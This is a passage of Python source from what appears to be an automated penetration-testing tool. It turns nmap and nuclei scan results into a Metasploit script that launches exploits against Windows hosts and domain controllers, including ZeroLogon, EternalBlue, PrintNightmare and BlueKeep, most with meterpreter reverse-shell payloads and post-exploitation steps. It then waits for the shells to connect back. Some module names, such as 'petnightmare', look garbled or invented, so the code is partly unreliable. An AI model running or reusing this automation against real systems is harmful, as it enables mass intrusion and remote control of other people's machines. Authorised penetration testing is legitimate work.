    # SMTP (port 25)
    if 25 in all_ports:
        add_module("auxiliary/scanner/smtp/smtp_enum")
        add_module("auxiliary/scanner/smtp/smtp_version")

    # HTTP / HTTPS — NTLM auth fingerprint + title grab
    if {80, 443, 8080, 8443, 8000, 8888} & all_ports:
        add_module("auxiliary/scanner/http/http_version")
        add_module("auxiliary/scanner/http/ntlm_info")
        add_module("auxiliary/scanner/http/title")

    # ── Windows / Active Directory Exploit Probes ─────────────────────
    # Targeted exploit attempts driven by detected OS + open ports.
    # Runs even without nuclei CVE findings — covers Windows Server 2019,
    # Domain Controllers, MSSQL, WinRM, IIS, and RDP attack surfaces.
    if windows_hosts or dc_hosts:
        lines.append("# === Windows / Active Directory Exploit Probes ===")
        _win_done: set[str] = set()

        def add_win(
            module: str,
            hosts: list[str],
            payload: str | None = None,
            extra: dict | None = None,
            post: bool = False,
        ):
            """Add Windows-specific exploit, skipping duplicates within this section."""
            if module in _win_done:
                return
            _win_done.add(module)
            add_module(module, target_hosts=_h(hosts),
                       payload=payload, extra=extra, post_exploit=post)

        # --- Domain Controller attacks (Kerberos + LDAP combo = DC) ---
        if dc_hosts:
            lines.append("# -- Domain Controller Attacks --")
            # ZeroLogon — unauthenticated DC account takeover
            add_win("auxiliary/admin/dcerpc/cve_2020_1472_zerologon", dc_hosts)
            # PetitPotam — unauthenticated NTLM relay coerce via LSARPC
            add_win("auxiliary/admin/dcerpc/cve_2021_36942_petnightmare", dc_hosts)
            # Certifried — ADCS privilege escalation (CVE-2022-26923)
            add_win("auxiliary/admin/dcerpc/cve_2022_26923_certifried", dc_hosts)
            # MS14-068 — Kerberos privilege escalation (older DCs)
            add_win("auxiliary/admin/kerberos/ms14_068_kerberos_checksum", dc_hosts,
                    extra={"DOMAIN": "", "USER": username or "Guest"})

        # --- Windows SMB exploits ---
        win_smb = [ip for ip in (windows_hosts or list((nmap_data or {}).keys()))
                   if nmap_data and 445 in nmap_data.get(ip, {}).get("ports", [])]
        if win_smb:
            lines.append("# -- Windows SMB Exploits --")
            # EternalBlue (MS17-010) — unpatched Windows SMB RCE
            add_win("exploit/windows/smb/ms17_010_eternalblue", win_smb,
                    payload="windows/x64/meterpreter/reverse_tcp", post=True)
            # EternalRomance / PSExec variant
            add_win("exploit/windows/smb/ms17_010_psexec", win_smb,
                    payload="windows/x64/meterpreter/reverse_tcp", post=True)
            # PrintNightmare — remote print spooler RCE (CVE-2021-1675)
            add_win("exploit/windows/smb/cve_2021_1675_printspooler", win_smb,
                    payload="windows/x64/meterpreter/reverse_tcp",
                    extra={"SMBUSER": username or "", "SMBPASS": password or ""},
                    post=True)
            if username and password:
                # PSExec with valid credentials (service-based RCE)
                add_win("exploit/windows/smb/psexec", win_smb,
                        payload="windows/x64/meterpreter/reverse_tcp",
                        extra={"SMBUser": username, "SMBPass": password},
                        post=True)

        # --- MSSQL code execution (SA or domain credentials) ---
        if mssql_hosts:
            lines.append("# -- MSSQL Exploitation --")
            add_win("exploit/windows/mssql/mssql_payload", mssql_hosts,
                    payload="windows/x64/meterpreter/reverse_tcp",
                    extra={"USERNAME": username or "sa", "PASSWORD": password or ""},
                    post=True)
            add_win("auxiliary/admin/mssql/mssql_exec", mssql_hosts,
                    extra={"USERNAME": username or "sa", "PASSWORD": password or "",
                           "CMD": "whoami /all"})

        # --- WinRM — PowerShell Remoting RCE (port 5985/5986) ---
        if winrm_hosts and username and password:
            lines.append("# -- WinRM Exploitation --")
            add_win("exploit/windows/winrm/winrm_script_exec", winrm_hosts,
                    payload="windows/x64/meterpreter/reverse_tcp",
                    extra={"USERNAME": username, "PASSWORD": password,
                           "FORCE_VBS": "true"},
                    post=True)

        # --- IIS / Windows web server attacks ---
        win_web = [ip for ip in (windows_hosts or [])
                   if nmap_data and
                   {80, 443, 8080, 8443} & set(nmap_data.get(ip, {}).get("ports", []))]
        if win_web:
            lines.append("# -- IIS / Windows Web Exploits --")
            # WebDAV buffer overflow (CVE-2017-7269 — IIS 6.0)
            add_win("exploit/windows/iis/iis_webdav_scstoragepathfromurl", win_web,
                    payload="windows/meterpreter/reverse_tcp", post=True)
            # NTLM challenge reveal — extract domain info from IIS NTLM auth
            add_win("auxiliary/scanner/http/ntlm_info", win_web,
                    extra={"RPORT": "80"})

        # --- RDP exploitation (BlueKeep — CVE-2019-0708) ---
        win_rdp = [ip for ip in (windows_hosts or [])
                   if nmap_data and 3389 in nmap_data.get(ip, {}).get("ports", [])]
        if win_rdp:
            lines.append("# -- RDP Exploits (BlueKeep) --")
            add_win("exploit/windows/rdp/cve_2019_0708_bluekeep_rce", win_rdp,
                    payload="windows/x64/meterpreter/reverse_tcp", post=True)

    # ── CVE-driven exploit modules from nuclei findings ─────────────
    # Merge static map with any auto-discovered entries
    active_cve_map = dict(CVE_TO_MSF)
    if extra_cve_map:
        active_cve_map.update(extra_cve_map)

    if nuclei_findings:
        lines.append("# === CVE-Driven Exploits (from Nuclei findings) ===")
        added_modules: set[str] = set()
        for finding in nuclei_findings:
            cve = finding.get("cve", "")
            host = finding.get("host", rhosts)
            # Normalize: strip port / path from host if needed
            if "://" in host:
                from urllib.parse import urlparse
                host = urlparse(host).hostname or host
            msf_info = active_cve_map.get(cve)
            if not msf_info:
                continue
            module = msf_info["module"]
            if module in added_modules:
                continue
            added_modules.add(module)
            payload = msf_info.get("payload")
            lines.append(f"# Auto-added: {cve} detected on {host}")
            add_module(
                module,
                target_hosts=host,
                payload=payload,
                post_exploit=bool(payload),
            )

    lines.append("# === Finish ===")
    lines.append("jobs -l")
    # Scanners against /24 subnets need 90-120s to complete.
    # Without this wait, msfconsole exits before background jobs finish
    # and reverse-shell sessions never get a chance to connect back.
    lines.append("sleep 120")
    lines.append("jobs -l")
    lines.append("sessions -l")
    lines.append("exit")

    return "\n".join(lines), post_rc_path


def collect_all_feed(output_dir: Path) -> dict:
    """Collect all available feed data from all phase outputs."""
    nmap_data = parse_nmap(output_dir)
    return {
        "nmap":          nmap_data,
        "hosts":         parse_amass(output_dir) or get_all_hosts(nmap_data),
        "smb_hosts":     get_smb_hosts(nmap_data),
        "web_hosts":     get_web_hosts(nmap_data),
        "rdp_hosts":     get_rdp_hosts(nmap_data),
        "ssh_hosts":     get_ssh_hosts(nmap_data),
        "winrm_hosts":   get_winrm_hosts(nmap_data),
        "mssql_hosts":   get_mssql_hosts(nmap_data),
        "ldap_hosts":    get_ldap_hosts(nmap_data),
        "dc_hosts":      get_dc_hosts(nmap_data),
        "windows_hosts": get_windows_hosts(nmap_data),
        "urls":          parse_httpx(output_dir) or get_web_urls(nmap_data),
        "findings":      parse_nuclei(output_dir),
    }
